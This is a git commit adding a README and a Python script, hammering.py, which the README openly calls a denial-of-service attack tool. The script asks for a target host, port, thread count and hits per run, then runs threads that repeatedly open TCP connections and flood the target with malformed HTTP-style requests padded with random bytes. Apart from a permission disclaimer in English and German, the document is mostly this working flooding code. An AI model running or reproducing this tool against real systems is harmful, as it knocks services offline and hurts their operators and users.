c616da3ea81076073a05ec72ce6585a1f81e427d
depascaldc <depascaldc@gmail.com>
2020-01-28 03:39:41 +0100

    Initial Commit

---
+++ README.md
@@ -0,0 +1,52 @@
+# Denial of Service (DoS) Attack Script
+
+```
+ ____       ____      _____           _ 
+|  _ \  ___/ ___|    |_   _|__   ___ | |
+| | | |/ _ \___ \ _____| |/ _ \ / _ \| |
+| |_| | (_) |__) |_____| | (_) | (_) | |
+|____/ \___/____/      |_|\___/ \___/|_|
+
+         written by: depascaldc
+         for private USAGE ONLY
+         Make sure you have the
+        permission to attack the
+               given host
+               
+```
+
+---
+### written by depascaldc
+
+- 
+- customizable host / port / threads / hits per run
+- 
+- command to start: `python3 hammering.py`
+- 
+---
+
+### EN - Disclaimer:
+```md
+THIS TOOL WAS WRITTEN FOR PRIVATE USAGE ONLY!
+
+Make sure you have right permissions to conduct DoS attacks on the target system. 
+
+These DoS script is intended for testing purposes only.
+
+I'm not to be held responsible for any result arising from a DoS attack launched using these script
+```
+---
+### DE - Haftungsausschluss:
+```md
+DIESES WERKZEUG WURDE NUR FÜR DEN PRIVATEN GEBRAUCH GESCHRIEBEN!
+
+Stellen Sie sicher, dass Sie über die erforderlichen Berechtigungen zum Ausführen von DoS-Angriffen auf das Zielsystem verfügen.
+
+Dieses DoS-Skript dient nur zu Testzwecken.
+
+Ich bin nicht verantwortlich für irgendwelche Ergebnisse, die sich aus einem DoS-Angriff ergeben, der mit diesem Skript gestartet wurde
+```
+---
+
+### Thanks for usng this Tool
+#### - depascaldc
---
+++ hammering.py
@@ -0,0 +1,110 @@
+import socket
+import time
+import os
+import random
+
+from threading import Thread
+
+os.system("clear")
+
+if not __name__ == "__main__":
+    exit()
+      
+class ConsoleColors:
+    HEADER = '\033[95m'
+    OKBLUE = '\033[94m'
+    OKGREEN = '\033[92m'
+    WARNING = '\033[93m'
+    FAIL = '\033[91m'
+    BOLD = '\033[1m'
+    
+print(ConsoleColors.BOLD + ConsoleColors.WARNING + '''
+ ____       ____      _____           _ 
+|  _ \  ___/ ___|    |_   _|__   ___ | |
+| | | |/ _ \___ \ _____| |/ _ \ / _ \| |
+| |_| | (_) |__) |_____| | (_) | (_) | |
+|____/ \___/____/      |_|\___/ \___/|_|
+
+         written by: depascaldc
+         for private USAGE ONLY
+         Make sure you have the
+        permission to attack the
+               given host
+               
+      ''')
+    
+def getport():
+    try:
+        p = int(input(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "Port:\r\n"))
+        return p
+    except ValueError:
+        print(ConsoleColors.BOLD + ConsoleColors.WARNING + "ERROR Port must be a number, Set Port to default " + ConsoleColors.OKGREEN + "80")
+        return 80
+
+host = input(ConsoleColors.BOLD + ConsoleColors.OKBLUE + "Host:\r\n")
+port = getport()
+speedPerRun = int(input(ConsoleColors.BOLD + ConsoleColors.HEADER + "Hits Per Run:\r\n"))
+threads = int(input(ConsoleColors.BOLD + ConsoleColors.WARNING + "Thread Count:\r\n"))
+
+ip = socket.gethostbyname(host)
+
+bytesToSend = random._urandom(2450)
+
+i = 0;
+
+
+
+class Count:
+    packetCounter = 0 
+
+def goForDosThatThing():
+    try:
+        while True:
+            dosSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                dosSocket.connect((ip, port))
+                for i in range(speedPerRun):
+                    try:
+                        dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
+                        dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
+                        print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "-----< PACKET " + ConsoleColors.FAIL + str(Count.packetCounter) + ConsoleColors.OKGREEN + " SUCCESSFUL SENT AT: " + ConsoleColors.FAIL + time.strftime("%d-%m-%Y %H:%M:%S", time.gmtime()) + ConsoleColors.OKGREEN + " >-----")
+                        Count.packetCounter = Count.packetCounter + 1
+                    except socket.error:
+                        print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
+                    except KeyboardInterrupt:
+                        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+            except socket.error:
+                print(ConsoleColors.WARNING + "ERROR, Maybe the host is down?!?!")
+            except KeyboardInterrupt:
+                print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+            dosSocket.close()
+    except KeyboardInterrupt:
+        print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
+try:
+        
+    print(ConsoleColors.BOLD + ConsoleColors.OKBLUE + '''
+    _   _   _             _      ____  _             _   _             
+   / \ | |_| |_ __ _  ___| | __ / ___|| |_ __ _ _ __| |_(_)_ __   __ _ 
+  / _ \| __| __/ _` |/ __| |/ / \___ \| __/ _` | '__| __| | '_ \ / _` |
+ / ___ \ |_| || (_| | (__|   <   ___) | || (_| | |  | |_| | | | | (_| |
+/_/   \_\__|\__\__,_|\___|_|\_\ |____/ \__\__,_|_|   \__|_|_| |_|\__, |
+                                                                 |___/ 
+          ''')
+    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [                    ] 0% ")
+    time.sleep(1)
+    print(ConsoleColors.BOLD + ConsoleColors.OKGREEN + "LOADING >> [=====               ] 25%")
+    time.sleep(1)
+    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [==========          ] 50%")
+    time.sleep(1)
+    print(ConsoleColors.BOLD + ConsoleColors.WARNING + "LOADING >> [===============     ] 75%")
+    time.sleep(1)
+    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "LOADING >> [====================] 100%")
+    
+    for i in range(threads):
+        try:
+            t = Thread(target=goForDosThatThing)
+            t.start()
+        except KeyboardInterrupt:
+            print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")    
+except KeyboardInterrupt:
+    print(ConsoleColors.BOLD + ConsoleColors.FAIL + "\r\n[-] Canceled by user")
